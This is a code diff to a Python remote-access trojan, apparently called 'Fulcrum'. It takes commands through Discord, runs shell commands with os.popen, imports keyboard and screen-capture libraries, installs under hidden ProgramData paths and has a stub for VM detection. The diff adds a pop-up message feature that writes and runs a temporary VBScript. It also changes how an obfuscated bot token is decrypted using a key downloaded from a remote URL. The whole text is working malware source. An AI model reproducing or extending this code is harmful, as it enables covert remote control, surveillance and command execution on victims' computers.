@@ -17,6 +17,8 @@ import keyboard
 from mss import mss
 from datetime import datetime
 from cryptography.fernet import Fernet
+import tempfile
+import threading
 
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
@@ -127,7 +129,7 @@ async def on_message(message):  # called when discord message was received
 
                 case "-MB":     # MESSAGE BOX
                     content = content.strip("-MB")
-                    ctypes.windll.user32.MessageBoxW(0, content, "...", 0)
+                    await fulcrum_util.display_message_box(content)
 
 
         case "shell":   # active shell
@@ -143,6 +145,8 @@ async def on_message(message):  # called when discord message was received
 
 
 class FulcrumUtil:
+    def __init__(self):
+        message_boxes = []
     def check_for_vm(self):
         # TODO check for typical vm names
         # TODO find solution to detect the windows defender vm
@@ -150,6 +154,26 @@ class FulcrumUtil:
 
     def run_command(self, command):
         return os.popen(command).read()
+
+    async def display_message_box(self, content):
+        # replace \n with VBScript's newline char
+        content = content.replace('\n', '" & vbCrLf & "')
+
+        # creating a temporary Visual Basic Script that displays the message box
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.vbs') as temp_vbs:
+            vbs_script = f'''
+            Set WshShell = WScript.CreateObject("WScript.Shell")
+            WshShell.Popup "{content}", 0, "...", 0
+            '''
+            temp_vbs.write(vbs_script.encode('utf-8'))
+            temp_vbs_path = temp_vbs.name
+
+        # run the VBScript file with subprocess
+        subprocess.Popen(['wscript', temp_vbs_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        # remove the temp file
+        time.sleep(1)
+        os.remove(temp_vbs_path)
 
     async def create_channel(self):
         # create new channel
@@ -297,12 +321,14 @@ class FulcrumUtil:
         # downloading the key.key file and decrypting the bot token
         self._download_file(DECRYPTION_KEY_URL, "key.key")
 
-        with open("key.key", "r") as key:
-            key = key.readline()
+        with open("key.key", "rb") as f:
+            key = f.readline()
             cipher = Fernet(key)
-            decrypted_token = token.swapcase()[4:-4]
-            decrypted_token = cipher.decrypt(decrypted_token).decode()
-        return decrypted_token
+            # remove obfuscation
+            decrypted_token = token.swapcase()[4:-4].encode()
+            # decrypt token
+            decrypted_token = cipher.decrypt(decrypted_token)
+        return decrypted_token.decode()
 
 
 
